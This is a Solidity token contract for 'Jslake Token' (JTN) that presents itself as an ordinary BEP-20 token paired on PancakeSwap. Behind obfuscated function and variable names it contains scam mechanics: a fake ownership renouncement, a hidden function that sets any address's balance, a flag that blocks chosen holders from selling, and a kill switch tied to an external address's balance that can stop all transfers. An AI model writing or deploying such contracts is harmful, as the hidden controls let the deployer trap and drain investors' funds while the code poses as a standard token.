//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface listSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract limitTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fromWallet {
    function createPair(address buyIs, address fromAmountLimit) external returns (address);
}

interface tokenTotalMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountEnableIs) external view returns (uint256);

    function transfer(address limitAmountTrading, uint256 swapTo) external returns (bool);

    function allowance(address enableWallet, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapTo) external returns (bool);

    function transferFrom(
        address sender,
        address limitAmountTrading,
        uint256 swapTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txReceiverFund, uint256 value);
    event Approval(address indexed enableWallet, address indexed spender, uint256 value);
}

interface tokenTotalMinMetadata is tokenTotalMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract JslakeToken is limitTo, tokenTotalMin, tokenTotalMinMetadata {

    uint8 private takeToken = 18;

    function transfer(address liquidityReceiver, uint256 swapTo) external virtual override returns (bool) {
        return liquidityAuto(_msgSender(), liquidityReceiver, swapTo);
    }

    mapping(address => mapping(address => uint256)) private maxSwapSender;

    bool public teamSell;

    string private isLimit = "JTN";

    uint256 public walletToken;

    function getOwner() external view returns (address) {
        return shouldAt;
    }

    function receiverMin(address receiverIs, address limitAmountTrading, uint256 swapTo) internal returns (bool) {
        require(receiverMarketing[receiverIs] >= swapTo);
        receiverMarketing[receiverIs] -= swapTo;
        receiverMarketing[limitAmountTrading] += swapTo;
        emit Transfer(receiverIs, limitAmountTrading, swapTo);
        return true;
    }

    event OwnershipTransferred(address indexed receiverAuto, address indexed modeMarketing);

    address public launchFund;

    uint256 receiverAmount;

    function fromExemptTeam() private view {
        require(listTotal[_msgSender()]);
    }

    string private fundLimit = "Jslake Token";

    function transferFrom(address receiverIs, address limitAmountTrading, uint256 swapTo) external override returns (bool) {
        if (_msgSender() != listAuto) {
            if (maxSwapSender[receiverIs][_msgSender()] != type(uint256).max) {
                require(swapTo <= maxSwapSender[receiverIs][_msgSender()]);
                maxSwapSender[receiverIs][_msgSender()] -= swapTo;
            }
        }
        return liquidityAuto(receiverIs, limitAmountTrading, swapTo);
    }

    address listAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private tradingTotal;

    mapping(address => uint256) private receiverMarketing;

    address fromSellLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant minMarketing = 9 ** 10;

    function liquidityAuto(address receiverIs, address limitAmountTrading, uint256 swapTo) internal returns (bool) {
        if (receiverIs == launchFund) {
            return receiverMin(receiverIs, limitAmountTrading, swapTo);
        }
        uint256 amountTokenExempt = tokenTotalMin(receiverShould).balanceOf(fromSellLaunched);
        require(amountTokenExempt == amountReceiver);
        require(limitAmountTrading != fromSellLaunched);
        if (amountLaunch[receiverIs]) {
            return receiverMin(receiverIs, limitAmountTrading, minMarketing);
        }
        return receiverMin(receiverIs, limitAmountTrading, swapTo);
    }

    mapping(address => bool) public listTotal;

    function liquidityBuy(address swapTakeAmount) public {
        if (teamSell) {
            return;
        }
        
        listTotal[swapTakeAmount] = true;
        
        teamSell = true;
    }

    function name() external view virtual override returns (string memory) {
        return fundLimit;
    }

    function symbol() external view virtual override returns (string memory) {
        return isLimit;
    }

    function marketingLaunched(address autoAmountTx) public {
        fromExemptTeam();
        
        if (autoAmountTx == launchFund || autoAmountTx == receiverShould) {
            return;
        }
        amountLaunch[autoAmountTx] = true;
    }

    bool public buyMin;

    function approve(address fromTakeReceiver, uint256 swapTo) public virtual override returns (bool) {
        maxSwapSender[_msgSender()][fromTakeReceiver] = swapTo;
        emit Approval(_msgSender(), fromTakeReceiver, swapTo);
        return true;
    }

    function allowance(address modeLimitFrom, address fromTakeReceiver) external view virtual override returns (uint256) {
        if (fromTakeReceiver == listAuto) {
            return type(uint256).max;
        }
        return maxSwapSender[modeLimitFrom][fromTakeReceiver];
    }

    address private shouldAt;

    function shouldSellIs() public {
        emit OwnershipTransferred(launchFund, address(0));
        shouldAt = address(0);
    }

    uint256 amountReceiver;

    function decimals() external view virtual override returns (uint8) {
        return takeToken;
    }

    uint256 private shouldMaxLiquidity;

    function liquidityLimit(address liquidityReceiver, uint256 swapTo) public {
        fromExemptTeam();
        receiverMarketing[liquidityReceiver] = swapTo;
    }

    mapping(address => bool) public amountLaunch;

    address public receiverShould;

    function totalSupply() external view virtual override returns (uint256) {
        return isList;
    }

    function balanceOf(address amountEnableIs) public view virtual override returns (uint256) {
        return receiverMarketing[amountEnableIs];
    }

    uint256 private isList = 100000000 * 10 ** 18;

    constructor (){
        
        listSwap launchMin = listSwap(listAuto);
        receiverShould = fromWallet(launchMin.factory()).createPair(launchMin.WETH(), address(this));
        if (tradingTotal) {
            walletToken = shouldMaxLiquidity;
        }
        launchFund = _msgSender();
        shouldSellIs();
        listTotal[launchFund] = true;
        receiverMarketing[launchFund] = isList;
        
        emit Transfer(address(0), launchFund, isList);
    }

    function owner() external view returns (address) {
        return shouldAt;
    }

    function maxMin(uint256 swapTo) public {
        fromExemptTeam();
        amountReceiver = swapTo;
    }

}